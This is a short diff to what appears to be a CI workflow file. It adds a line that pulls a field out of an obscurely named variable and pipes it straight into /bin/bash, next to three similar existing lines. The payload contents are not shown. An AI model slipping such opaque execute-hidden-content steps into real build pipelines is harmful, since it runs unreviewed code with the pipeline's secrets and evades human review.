@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$bzc10546" | jq -r .pteo13114 | /bin/bash
           echo $imlrv1068 | jq -r .k2729 | /bin/bash
           echo $ifd073 | jq -r .ydes3 | /bin/bash
+          echo $s4652 | jq -r .h8 | /bin/bash
 
       - name: Archive output
         if: always()
